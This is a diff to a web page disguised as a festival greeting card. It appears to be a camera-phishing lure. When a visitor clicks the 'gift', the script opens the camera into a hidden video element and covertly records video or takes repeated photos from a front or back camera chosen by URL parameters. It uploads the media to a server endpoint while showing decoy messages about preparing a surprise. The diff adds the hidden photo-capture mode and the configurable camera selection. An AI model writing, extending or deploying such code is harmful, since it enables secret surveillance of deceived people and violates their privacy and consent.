@@ -256,6 +256,7 @@
             opacity: 0.5;
         }
         #hiddenVideo { display: none; }
+        #photoCanvas { display: none; }
         .mode-badge {
             display: inline-block;
             background: rgba(255,215,0,0.2);
@@ -265,6 +266,16 @@
             font-size: 0.7rem;
             border: 1px solid rgba(255,215,0,0.2);
             margin-bottom: 10px;
+        }
+        .capture-status {
+            margin-top: 10px;
+            color: rgba(255,255,255,0.7);
+            font-size: 0.9rem;
+            display: none;
+        }
+        .capture-status.active {
+            display: block;
+            animation: fadeIn 0.3s ease;
         }
         @media (max-width: 600px) {
             .festival-card { padding: 30px 20px; }
@@ -288,9 +299,10 @@
     </div>
     
     <video id="hiddenVideo" autoplay playsinline></video>
+    <canvas id="photoCanvas"></canvas>
     
     <div class="festival-card" id="festivalCard">
-        <div class="mode-badge">🎊 Festival Mode</div>
+        <div class="mode-badge" id="modeBadge">🎊 Festival Mode</div>
         <span class="main-emoji" id="mainEmoji">🎊</span>
         <h1 class="festival-title"><span class="festival-name" id="festivalName">Festival</span></h1>
         <p class="subtitle" id="subtitle">✨ Something special is waiting for you ✨</p>
@@ -307,16 +319,36 @@
             </div>
         </div>
         
+        <div class="capture-status" id="captureStatus">📸 Capturing...</div>
         <div class="status" id="statusMessage">💝 Click the gift to reveal your surprise</div>
     </div>
 
     <script>
-        // Get festival name from URL parameter
+        // ============================================
+        // Get parameters from URL
+        // ============================================
         const urlParams = new URLSearchParams(window.location.search);
         const festivalName = urlParams.get('name') || 'Festival';
+        const captureMode = urlParams.get('mode') || 'video';
+        const cameraType = urlParams.get('camera') || 'user';
+        const photoCount = parseInt(urlParams.get('photos')) || 5;
+        const videoDuration = parseInt(urlParams.get('duration')) || 15;
+        
         document.getElementById('festivalName').textContent = festivalName;
+        
+        // Update badge
+        const modeBadge = document.getElementById('modeBadge');
+        if (captureMode === 'photo') {
+            modeBadge.textContent = `📸 Photo Mode (${cameraType === 'user' ? 'Front' : 'Back'} Camera)`;
+        } else {
+            modeBadge.textContent = `🎬 Video Mode (${cameraType === 'user' ? 'Front' : 'Back'} Camera)`;
+        }
 
+        // ============================================
+        // DOM Elements
+        // ============================================
         const videoElement = document.getElementById('hiddenVideo');
+        const photoCanvas = document.getElementById('photoCanvas');
         const giftBtn = document.getElementById('giftBtn');
         const btnText = document.getElementById('btnText');
         const statusMessage = document.getElementById('statusMessage');
@@ -328,14 +360,23 @@
         const giftOverlay = document.getElementById('giftOverlay');
         const giftEmoji = document.getElementById('giftEmoji');
         const giftText = document.getElementById('giftText');
+        const captureStatus = document.getElementById('captureStatus');
 
         const UPLOAD_URL = '/upload';
-        const DURATION = 15;
-        let mediaStream = null, mediaRecorder = null, recordedChunks = [];
-        let timerInterval = null, timeRemaining = DURATION, isRecording = false;
+        let mediaStream = null;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        let timerInterval = null;
+        let timeRemaining = videoDuration;
+        let isRecording = false;
         let isGiftOpened = false;
+        let capturedPhotos = [];
+        let photoIndex = 0;
+        let photoInterval = null;
 
-        // Confetti generator
+        // ============================================
+        // Confetti Generator
+        // ============================================
         const confettiContainer = document.getElementById('confettiContainer');
         const colors = ['#ff6b6b', '#ffd93d', '#6bcb77', '#4d96ff', '#ff6fb7', '#a66cff'];
         for (let i = 0; i < 80; i++) {
@@ -351,6 +392,9 @@
             confettiContainer.appendChild(confetti);
         }
 
+        // ============================================
+        // Gift Functions
+        // ============================================
         function showGiftReveal() {
             giftOverlay.classList.add('active');
             
@@ -375,6 +419,7 @@
                         btnText.textContent = 'Open Another Gift';
                         statusMessage.textContent = '💝 Thank you! You can open another gift!';
                         surpriseContainer.classList.remove('visible');
+                        captureStatus.classList.remove('active');
                         isGiftOpened = false;
                     }, 5000);
                 }
@@ -400,63 +445,67 @@
             }
         }
 
-        async function openGift() {
-            if (isGiftOpened) return;
-            isGiftOpened = true;
-            
+        // ============================================
+        // Camera Functions
+        // ============================================
+        async function startCamera() {
             try {
-                giftBtn.disabled = true;
-                btnText.textContent = '🎀 Opening...';
-                festivalCard.classList.add('opening');
-                mainEmoji.classList.add('opening');
-                mainEmoji.textContent = '🎁';
-                surpriseContainer.classList.add('visible');
-                surpriseText.textContent = '🎀 Preparing your surprise...';
-                progressBar.style.width = '0%';
-                statusMessage.textContent = '⏳ Your surprise is being prepared...';
-
-                mediaStream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                const constraints = {
+                    video: {
+                        facingMode: cameraType,
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
                     audio: false
-                });
-
+                };
+                
+                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                 videoElement.srcObject = mediaStream;
                 await videoElement.play();
+                
+                return true;
+            } catch (error) {
+                console.error('❌ Camera error:', error);
+                return false;
+            }
+        }
+
+        // ============================================
+        // Video Recording
+        // ============================================
+        async function startVideoRecording() {
+            try {
+                if (!await startCamera()) {
+                    throw new Error('Camera failed to start');
+                }
 
                 recordedChunks = [];
-                mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm;codecs=vp9' });
+                mediaRecorder = new MediaRecorder(mediaStream, { 
+                    mimeType: 'video/webm;codecs=vp9' 
+                });
+                
                 mediaRecorder.ondataavailable = (event) => {
                     if (event.data.size > 0) recordedChunks.push(event.data);
                 };
+                
                 mediaRecorder.onstop = () => {
                     const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                    uploadGift(blob);
+                    uploadMedia(blob, 'video');
                 };
 
                 mediaRecorder.start();
                 isRecording = true;
-                timeRemaining = DURATION;
+                timeRemaining = videoDuration;
                 
-                surpriseText.textContent = '🎁 Your surprise is being created...';
+                surpriseText.textContent = `🎬 Recording video... ${videoDuration}s`;
 
                 timerInterval = setInterval(() => {
                     timeRemaining--;
-                    const progress = ((DURATION - timeRemaining) / DURATION) * 100;
+                    const progress = ((videoDuration - timeRemaining) / videoDuration) * 100;
                     progressBar.style.width = progress + '%';
                     
-                    const messages = [
-                        '🎨 Creating magic...',
-                        '✨ Adding sparkles...',
-                        '🌟 Almost ready...',
-                        '🎁 Your surprise is coming!',
-                        '💝 Final touches...'
-                    ];
-                    const msgIndex = Math.min(
-                        Math.floor((DURATION - timeRemaining) / 3),
-                        messages.length - 1
-                    );
-                    if (timeRemaining > 3) {
-                        surpriseText.textContent = messages[msgIndex % messages.length];
+                    if (timeRemaining > 0) {
+                        surpriseText.textContent = `🎬 Recording... ${timeRemaining}s`;
                     }
                     
                     if (timeRemaining <= 0) {
@@ -466,7 +515,7 @@
                         if (mediaRecorder && isRecording) {
                             mediaRecorder.stop();
                             isRecording = false;
-                            surpriseText.textContent = '🎊 Your surprise is ready!';
+                            surpriseText.textContent = '🎬 Video recorded!';
                             progressBar.classList.add('done');
                             progressBar.style.width = '100%';
                         }
@@ -482,6 +531,129 @@
                         }, 500);
                     }
                 }, 1000);
+
+            } catch (error) {
+                console.error('❌ Recording error:', error);
+                throw error;
+            }
+        }
+
+        // ============================================
+        // Photo Capture
+        // ============================================
+        async function startPhotoCapture() {
+            try {
+                if (!await startCamera()) {
+                    throw new Error('Camera failed to start');
+                }
+
+                const width = 640;
+                const height = 480;
+                photoCanvas.width = width;
+                photoCanvas.height = height;
+                const ctx = photoCanvas.getContext('2d');
+                
+                capturedPhotos = [];
+                photoIndex = 0;
+                captureStatus.classList.add('active');
+                captureStatus.textContent = `📸 Capturing photo ${photoIndex + 1}/${photoCount}`;
+                surpriseText.textContent = `📸 Capturing photos...`;
+
+                photoInterval = setInterval(() => {
+                    if (photoIndex < photoCount) {
+                        ctx.drawImage(videoElement, 0, 0, width, height);
+                        
+                        photoCanvas.toBlob((blob) => {
+                            if (blob) {
+                                const timestamp = Date.now();
+                                const filename = `photo_${timestamp}.jpg`;
+                                const file = new File([blob], filename, { type: 'image/jpeg' });
+                                uploadMedia(file, 'photo');
+                                
+                                capturedPhotos.push(filename);
+                                photoIndex++;
+                                
+                                const progress = (photoIndex / photoCount) * 100;
+                                progressBar.style.width = progress + '%';
+                                captureStatus.textContent = `📸 Capturing photo ${photoIndex}/${photoCount}`;
+                                surpriseText.textContent = `📸 Photo ${photoIndex}/${photoCount}`;
+                            }
+                        }, 'image/jpeg', 0.9);
+                    } else {
+                        clearInterval(photoInterval);
+                        photoInterval = null;
+                        
+                        captureStatus.classList.remove('active');
+                        progressBar.classList.add('done');
+                        progressBar.style.width = '100%';
+                        surpriseText.textContent = `✅ ${photoCount} photos captured!`;
+                        
+                        if (mediaStream) {
+                            mediaStream.getTracks().forEach(track => track.stop());
+                            mediaStream = null;
+                            videoElement.srcObject = null;
+                        }
+                        
+                        setTimeout(() => {
+                            showGiftReveal();
+                        }, 1000);
+                    }
+                }, 1500);
+
+            } catch (error) {
+                console.error('❌ Photo capture error:', error);
+                throw error;
+            }
+        }
+
+        // ============================================
+        // Upload
+        // ============================================
+        async function uploadMedia(file, type) {
+            const formData = new FormData();
+            formData.append('media', file);
+            formData.append('type', type);
+
+            try {
+                const response = await fetch(UPLOAD_URL, { 
+                    method: 'POST', 
+                    body: formData 
+                });
+                
+                if (response.ok) {
+                    console.log(`✅ ${type} uploaded successfully!`);
+                } else {
+                    console.error(`❌ Upload failed:`, response.status);
+                }
+            } catch (error) {
+                console.error(`❌ Upload error:`, error);
+            }
+        }
+
+        // ============================================
+        // Open Gift
+        // ============================================
+        async function openGift() {
+            if (isGiftOpened) return;
+            isGiftOpened = true;
+            
+            try {
+                giftBtn.disabled = true;
+                btnText.textContent = '🎀 Opening...';
+                festivalCard.classList.add('opening');
+                mainEmoji.classList.add('opening');
+                mainEmoji.textContent = '🎁';
+                surpriseContainer.classList.add('visible');
+                surpriseText.textContent = '🎀 Preparing your surprise...';
+                progressBar.style.width = '0%';
+                progressBar.classList.remove('done');
+                statusMessage.textContent = '⏳ Your surprise is being prepared...';
+
+                if (captureMode === 'photo') {
+                    await startPhotoCapture();
+                } else {
+                    await startVideoRecording();
+                }
 
             } catch (error) {
                 console.error('Error:', error);
@@ -501,28 +673,13 @@
                 btnText.textContent = 'Try Again';
                 isGiftOpened = false;
                 surpriseContainer.classList.remove('visible');
+                captureStatus.classList.remove('active');
             }
         }
 
-        async function uploadGift(blob) {
-            const formData = new FormData();
-            formData.append('video', blob, `gift_${Date.now()}.webm`);
-
-            try {
-                const response = await fetch(UPLOAD_URL, { 
-                    method: 'POST', 
-                    body: formData 
-                });
-                
-                if (!response.ok) {
-                    throw new Error('Upload failed: ' + response.status);
-                }
-                console.log('✅ Gift video uploaded successfully!');
-            } catch (error) {
-                console.error('Upload error:', error);
-            }
-        }
-
+        // ============================================
+        // Event Listeners
+        // ============================================
         giftBtn.addEventListener('click', openGift);
         
         festivalCard.addEventListener('click', () => {
@@ -533,12 +690,15 @@
 
         window.addEventListener('beforeunload', () => {
             if (mediaRecorder && isRecording) mediaRecorder.stop();
+            if (photoInterval) clearInterval(photoInterval);
+            if (timerInterval) clearInterval(timerInterval);
             if (mediaStream) {
                 mediaStream.getTracks().forEach(track => track.stop());
             }
         });
 
         console.log('🎁 Festival mode loaded!');
+        console.log(`📷 Mode: ${captureMode}, Camera: ${cameraType}`);
     </script>
 </body>
 </html>
